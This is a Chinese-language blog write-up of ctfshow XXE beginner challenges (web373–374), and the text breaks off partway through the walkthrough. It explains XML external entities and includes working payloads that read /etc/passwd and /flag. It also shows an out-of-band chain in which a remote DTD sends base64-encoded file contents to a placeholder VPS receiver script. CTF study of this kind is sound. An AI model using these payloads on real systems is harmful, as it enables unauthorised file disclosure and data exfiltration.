@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XXEXXE（XML External Entity）漏洞是一种安全漏洞，发生在应用程序未正确配置 XML 解析器时。攻击者可以利用这种漏洞来访问应用程序中的文件系统、执行远程网络请求以及执行其他操作。XXE 漏洞通常存在于那些使用 XML 格式来处理数据的应用程序中，例如 Web 应用程序中的 XML 解析器、SOAP Web Services 等。 攻击者利用 XXE 漏洞的一种常见方式是通过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-xxe入门">
+<meta property="og:url" content="http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="XXEXXE（XML External Entity）漏洞是一种安全漏洞，发生在应用程序未正确配置 XML 解析器时。攻击者可以利用这种漏洞来访问应用程序中的文件系统、执行远程网络请求以及执行其他操作。XXE 漏洞通常存在于那些使用 XML 格式来处理数据的应用程序中，例如 Web 应用程序中的 XML 解析器、SOAP Web Services 等。 攻击者利用 XXE 漏洞的一种常见方式是通过">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-04T16:19:02.000Z">
+<meta property="article:modified_time" content="2024-05-04T16:19:13.888Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-xxe入门</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-xxe入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-xxe入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-xxe入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xxe入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-xxe入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-xxe入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">1.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web373-%E7%AE%80%E5%8D%95%E7%9A%84XXE%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.</span> <span class="toc-text">web373 - 简单的XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E8%AF%BB%E5%8F%96XML%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">详解读取XML的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E6%94%BB%E5%87%BBpayload"><span class="toc-number">1.1.2.</span> <span class="toc-text">详解攻击payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xml-%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">xml 实体引用格式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBpayload%E7%BC%96%E5%86%99"><span class="toc-number">1.1.3.</span> <span class="toc-text">攻击payload编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web374"><span class="toc-number">1.2.</span> <span class="toc-text">web374</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%BE%93%E5%87%BA%E5%A4%96%E5%B8%A6%E5%92%8C%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">将输出外带和引用外部实体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFxml%E7%9A%84"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">什么是xml的%</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web375"><span class="toc-number">1.3.</span> <span class="toc-text">web375</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web376"><span class="toc-number">1.4.</span> <span class="toc-text">web376</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web377-%E8%BD%AC%E6%8D%A2%E6%96%87%E6%9C%AC%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%AF%B9xml%E7%9A%84%E6%AD%A3%E5%88%99%E7%BA%A6%E6%9D%9F"><span class="toc-number">1.5.</span> <span class="toc-text">web377 - 转换文本编码绕过对xml的正则约束</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web378-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%9A%84xxe"><span class="toc-number">1.6.</span> <span class="toc-text">web378 - 登录页面的xxe</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-xxe入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:19:02.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE（XML External Entity）漏洞是一种安全漏洞，发生在应用程序未正确配置 XML 解析器时。攻击者可以利用这种漏洞来访问应用程序中的文件系统、执行远程网络请求以及执行其他操作。XXE 漏洞通常存在于那些使用 XML 格式来处理数据的应用程序中，例如 Web 应用程序中的 <code>XML 解析器</code>、<code>SOAP Web Services</code> 等。</p>
+<p>攻击者利用 XXE 漏洞的一种常见方式是通过在 XML 数据中注入恶意实体来触发漏洞。例如，攻击者可以通过在 XML 数据中插入类似于以下内容的实体来读取敏感文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，<code>&amp;xxe;</code> 实体将被解析为 <code>file:///etc/passwd</code>，导致应用程序尝试读取 <code>/etc/passwd</code> 文件并将其返回给攻击者。</p>
+<p>为了防止 XXE 漏洞，应用程序应该使用安全的 XML 解析器，并配置解析器以禁用实体扩展功能。另外，应该避免从用户控制的输入构造 XML 数据，或者在构造 XML 数据时使用安全的方式来处理输入。</p>
+<h2 id="web373-简单的XXE攻击"><a href="#web373-简单的XXE攻击" class="headerlink" title="web373 - 简单的XXE攻击"></a>web373 - 简单的XXE攻击</h2><h3 id="详解读取XML的过程"><a href="#详解读取XML的过程" class="headerlink" title="详解读取XML的过程"></a>详解读取XML的过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>); <span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 从post读一个数据流，放到$xmlfile变量里</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>(); <span class="comment">// 加载XML数据</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">// 使用 LIBXML_NOENT 和 LIBXML_DTDLOAD 标记来解析实体，这意味着如果 XML 数据包含外部实体引用，它们将被解析并包含在文档中。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">// 尝试将解析后的 XML 数据转换为 SimpleXMLElement</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow; <span class="comment">// 输出名为 ctfshow 的元素的内容，将该内容储存在变量中。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;  <span class="comment">// echo出这个变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+
+<h3 id="详解攻击payload"><a href="#详解攻击payload" class="headerlink" title="详解攻击payload"></a>详解攻击payload</h3><p>攻击payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们一条条询问GPT，并逐条解释。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>XML 的声明部分，指定了 XML 版本。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!DOCTYPE foo [...] &gt;</code>为 DOCTYPE 声明，用于定义 XML 文档的 DTD（文档类型定义）。在这里，foo 是根元素的名称，[…] 中定义了 DTD 的内容。</p>
+<blockquote>
+<p>DTD（Document Type Definition，文档类型定义）是一种用于定义 XML 文档结构的规范。它定义了 XML 文档中可以包含的元素、属性和实体的结构，以及它们之间的关系。DTD 可以在 XML 文档中使用 DOCTYPE 声明来引用，从而告诉解析器如何解析文档。</p>
+</blockquote>
+<blockquote>
+<p>在上面的攻击载荷中，DTD 用于定义 XML 文档的结构，并利用了 XXE 漏洞的特性。具体来说，<code>&lt;!DOCTYPE foo [...] &gt;</code> 声明引入了一个名为 foo 的根元素，并在其中定义了一个任意元素（ANY），表示该元素可以包含任何内容。这种定义使得攻击者可以在 XML 数据中引用外部实体，并将其内容包含在文档中，从而导致了 XXE 漏洞的利用。</p>
+</blockquote>
+<p><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 定义了一个名为 <code>xxe</code> 的外部实体，其内容来自于指定的系统文件 <code>&quot;file:///etc/passwd&quot;</code>。这个外部实体的作用是在 XML 解析过程中，当解析器遇到 <code>&amp;xxe;</code> 这个实体引用时，会尝试将其替换为实体的内容，即读取 <code>/etc/passwd</code> 文件的内容。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这个攻击载荷中，<code>&lt;creds&gt;</code> 元素包含了一个子元素 <code>&lt;ctfshow&gt;</code>，并在其中包含了 <code>&amp;xxe;</code> 实体引用。当 XML 解析器处理这个 XML 数据时，它会尝试将 <code>&amp;xxe;</code> 实体引用替换为实体的内容。由于 <code>xxe</code> 实体在 DTD 中被定义为一个外部实体，并且指向了 <code>/etc/passwd</code> 文件，因此解析器会尝试读取 <code>/etc/passwd</code> 文件的内容，并将其作为 <code>ctfshow</code> 元素的内容返回给应用程序。</p>
+</blockquote>
+<blockquote>
+<p>这个攻击的目的是利用 XXE 漏洞读取敏感文件的内容，而不是简单地输出 <code>&amp;xxe;</code> 字符串。通过将 <code>&amp;xxe;</code> 实体引用嵌入到 XML 数据中，并使解析器解析该实体引用，攻击者可以获取服务器上敏感文件的内容，从而进行进一步的攻击。</p>
+</blockquote>
+<h4 id="xml-实体引用格式"><a href="#xml-实体引用格式" class="headerlink" title="xml 实体引用格式"></a>xml 实体引用格式</h4><p>在上面的攻击载荷中，我们提到<code>&amp;xxe;</code>。这是一种 XML 中的实体引用格式。XML 中的实体引用用于在文档中引用已定义的实体，可以是内部实体（在文档内定义的）或外部实体（在 DTD 中定义的）。<strong>实体引用以 <code>&amp;</code> 开头，以 <code>;</code> 结尾</strong>。</p>
+<p>除了 <code>&amp;xxe;</code> 这种自定义的实体引用外，XML 还有几种内置的实体引用，如下所示：</p>
+<ul>
+<li><code>&amp;lt;</code>：小于号 (<code>&lt;</code>)</li>
+<li><code>&amp;gt;</code>：大于号 (<code>&gt;</code>)</li>
+<li><code>&amp;amp;</code>：和号 (<code>&amp;</code>)</li>
+<li><code>&amp;quot;</code>：双引号 (<code>&quot;</code>)</li>
+<li><code>&amp;apos;</code>：单引号 (<code>&#39;</code>)<br>这些内置实体引用用于在 XML 中表示特殊字符，以避免与 XML 标记产生冲突。</li>
+</ul>
+<p>XML 中的实体可以分为两类：内部实体和外部实体。内部实体直接在 XML 文档中定义，如：<code>&lt;!ENTITY hello &quot;Hello, World!&quot;&gt;</code></p>
+<p>外部实体则在 DTD 中定义，如：<code>&lt;!ENTITY foo SYSTEM &quot;foo.txt&quot;&gt;</code></p>
+<p>在 XML 文档中引用实体时，可以使用 <code>&amp;</code> 符号加上实体名称来引用实体。例如，要引用上面定义的 <code>hello</code> 实体，可以使用 <code>&amp;hello;</code>。</p>
+<h3 id="攻击payload编写"><a href="#攻击payload编写" class="headerlink" title="攻击payload编写"></a>攻击payload编写</h3><p>根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/116487425">wp</a>，flag路径是<code>/flag</code>。那直接修改payload即可。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+
+<p>比起web373来说，少了输出，没有回显。需要尝试把内容带出来。</p>
+<h3 id="将输出外带和引用外部实体"><a href="#将输出外带和引用外部实体" class="headerlink" title="将输出外带和引用外部实体"></a>将输出外带和引用外部实体</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/120211251">wp</a>的题解是这样的：</p>
+<p>在服务器放置 <code>xxe.php</code> 和 <code>xxe.xml</code> 两个文件：</p>
+<p>xxe.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;更新时间:&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>).<span class="string">&quot;\n&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no data input&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>xxe.xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vps_ip:vps_port/xxe.php?1=%file;&#x27;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>然后，发送到服务器的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps_ip:vps_port/xxe.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>来分析一下流程。首先，在服务器准备好接收的服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim xxe.php <span class="comment"># 写接收flag的服务，get传参传到这里头</span></span><br><span class="line">php -S 0.0.0.0:vps_port <span class="comment"># 运行本地服务</span></span><br></pre></td></tr></table></figure>
+<p>同时，在本地准备好xml文件，做外部实体：</p>
